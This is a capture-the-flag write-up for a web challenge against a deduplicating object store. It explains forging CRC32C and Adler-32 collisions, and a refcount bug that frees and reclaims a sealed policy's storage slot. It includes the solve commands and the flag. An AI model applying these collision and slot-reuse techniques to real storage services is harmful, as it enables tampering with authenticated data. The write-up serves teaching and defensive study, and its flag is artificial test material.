# Moraine

**Category:** Web · **Flag:** `isfcr{moraine_7d48_slot_e3f0955a_reclaimed}`

## Challenge

Moraine ("Frostline cold archive") is a small content-addressed object-storage service. Each team opens a private **bucket** (`POST /session` → a `base` URL) containing a keeper-owned, protected file `bay-07.policy`. The full API is in [`HANDOUT.md`](./HANDOUT.md); [`client.py`](./client.py) wraps it (`open`, `ls`, `put`, `stat`, `get`, `rm`, `usage`, `release`).

The policy is JSON listing which operator IDs may open bay 07. `POST /release` opens the bay for any operator whose id appears under `release.to`, and otherwise returns `403 not_listed`. Our operator (`op-wm5caj`) was not on the list:

```json
{"error": "not_listed", "detail": "op-wm5caj is not on the bay policy's release list"}
```

We can read the policy but not change or delete it — it belongs to the keeper, and its record (revision, whole-file `sum`, chunk list) is protected by an HMAC **seal** under a key only the keeper holds.

## Initial Analysis

The storage model is the whole game. Objects are split into **variable-size, content-defined chunks**; identical chunks are **deduplicated** — stored once in a numbered *slot* and referenced by every object that contains them. An object's record lists each chunk's `{slot, len, tag}`, where `tag` is a bucket-seeded 32-bit integrity tag.

A sample policy record:

```json
{
  "chunks": [
    {"len": 335, "slot": 0, "tag": "45a3d0dc"},
    {"len": 246, "slot": 1, "tag": "98386927"},
    ...
  ],
  "revision": 70, "size": 1433, "sum": "17b8a325"
}
```

Forging the HMAC is hopeless. But the seal authenticates the **metadata**, not an immutable copy of the bytes. The release path: verify seal against the record → read the policy bytes from storage → check them against `sum` → look up the operator. So if we can change the **bytes in an existing slot** while keeping that slot's `len`, its `tag`, and the whole-file `sum` identical, the unchanged seal still verifies and the keeper reads *our* contents.

The first chunk (slot 0) holds the header and the first authorized operator id. Three sub-problems:

1. Change `kp-9xmkev` → `op-wm5caj` in that chunk.
2. Preserve the chunk's 32-bit `tag` **and** the whole-file `sum`.
3. Get the allocator to place our forged chunk into the policy's slot 0.

## Vulnerability / Core Concept

### Checksums are forgeable

- The whole-file `sum` is **Adler-32** (`zlib.adler32(policy) == 0x17b8a325`).
- The per-chunk `tag` behaves like a **bucket-seeded CRC32C**. We don't know the seed — but CRC is affine, so for equal-length messages the difference caused by editing bytes is independent of the seed. Two chunks that collide under plain CRC32C also collide under the seeded `tag`.

So we need a 335-byte chunk that (a) contains `op-wm5caj`, (b) has the same plain CRC32C as the original, and (c) leaves the file's Adler-32 unchanged — all editing only **ignored** JSON string values (`vault`, `issued_by`, `issued`), which the release code doesn't care about.

**Adler-32** is two running sums; a byte delta `d[i]` at position `i` is cancelled when `Σ d[i] ≡ 0` and `Σ (N−i)·d[i] ≡ 0 (mod 65521)`. Two harmless edits fix the ID change; then independent `[t, −2t, t]` deltas on adjacent byte triples preserve both sums for free (`t − 2t + t = 0`, and adjacency cancels the weighted term).

**CRC32C** is linear over XOR. With 14 independent triples × 8 printable choices each, a naive search is 8¹⁴ — too big — so [`mitm_solve.py`](./mitm_solve.py) does a **meet-in-the-middle**: enumerate the first 7 groups (8⁷ ≈ 2.1M) into a table of CRC effects, enumerate the other 7, and look up the complement that restores the original CRC. ~5 s, ~225 MB.

### Deduplication reference-counting bug frees the keeper's slot

Even with correct bytes/`tag`/`sum`, content-defined chunking can split a 335-byte forgery into two chunks, and it lands in some slot ≠ 0. The missing primitive is a way to **free slot 0** and then make the allocator reuse it:

- Repeat the original slot-0 chunk 24× into one 8040-byte object (just under the 8192 limit). Because the original chunk ends on a content-defined boundary, it parses as 24 chunks that **all reference slot 0**, storing `stored_bytes: 0` (pure dedup references).
- Deleting that object **over-decrements** slot 0's refcount: creation counts the shared slot once, but deletion walks *every* occurrence in the chunk list. Slot 0 lands on the free list even though the keeper's policy still references it. Freeing a slot doesn't erase its bytes, so the policy still reads correctly — until the slot is reused.

Fill the bucket toward its 512-slot limit with random data (many unique chunks), and new uploads start reusing freed slots. Repeatedly delete/re-upload a known one-chunk forgery until it lands in **slot 0**. The keeper's policy then transparently reads our forged bytes with the *same* revision, size, chunk list, `tag`s, `sum`, and seal.

## Exploitation

**1. Forge the first chunk** ([`mitm_solve.py`](./mitm_solve.py), parameterized by policy file / target id / chunk length; [`solve_patch.py`](./solve_patch.py) is an alternative Z3-based collision generator):

```bash
python3 mitm_solve.py policy.bin op-wm5caj 335 forged0.bin 50   # emit 50 collisions
```

```text
Original first-chunk CRC32C:  a3f0338f   Forged: a3f0338f
Original whole-file Adler32:  17b8a325   Forged: 17b8a325
"id": "op-wm5caj"
```

It emits several collisions because the first candidate may re-split into two chunks; upload them until one stays a single 335-byte chunk carrying the needed `tag`:

```json
{"chunks": [{"len": 335, "slot": 12, "tag": "45a3d0dc"}]}
```

**2. Free slot 0** via the dedup bug:

```bash
head -c 335 policy.bin > orig0.bin
python3 -c "x=open('orig0.bin','rb').read(); open('orig24.bin','wb').write(x*24)"
python3 client.py "$BASE" put  origbig orig24.bin   # {"chunks":24,"size":8040,"stored_bytes":0}
python3 client.py "$BASE" rm   origbig              # over-decrements slot 0 -> free list
```

**3. Reclaim slot 0.** Fill toward the slot cap, then churn the forgery until it reuses slot 0:

```bash
for i in $(seq -w 0 20); do head -c 8192 /dev/urandom > /tmp/f$i.bin
  python3 client.py "$BASE" put f$i /tmp/f$i.bin; done
while true; do
  python3 client.py "$BASE" rm   c003
  python3 client.py "$BASE" put  c003 forged0.bin.002
  python3 client.py "$BASE" stat c003      # watch "slot" until it prints 0
done
```

Allocated slots walked down `491, 492, 493, 494, 13, 0` — once it hit **0**, the protected policy read our operator.

**4. Release:**

```bash
python3 client.py "$BASE" release
```

```json
{"flag": "isfcr{moraine_7d48_slot_e3f0955a_reclaimed}", "operator": "op-wm5caj", "released": true}
```

> `policy.bin` here is a sample policy dump (keeper `kp-pthyvv`, revision 56) kept so the collision generators are runnable; it carries no server secret (the HMAC key and flag live server-side). The narrative above uses a different session's keeper/operator ids — expected, since each bucket is fresh.

## Flag

```
isfcr{moraine_7d48_slot_e3f0955a_reclaimed}
```

## Key Takeaways

- **Authenticate the bytes, not just the metadata.** The HMAC sealed the chunk list, but content-addressed storage let us swap the underlying bytes of an already-sealed slot — never learning the key.
- **32-bit CRC/Adler are forgeable by construction.** CRC32C is affine (a secret seed doesn't stop equal-length differential collisions) and Adler-32's two linear sums are easy to keep fixed while editing ignored fields; a meet-in-the-middle search makes the 14-group CRC collision tractable in seconds.
- **Dedup refcounting is a classic double-free analog:** when create and delete account for shared references asymmetrically, one object full of repeated chunks can free a slot another object still owns.
- Content-defined chunking means a byte-exact, CRC-exact forgery can still re-split — generate many candidates and pick one that stays a single chunk.
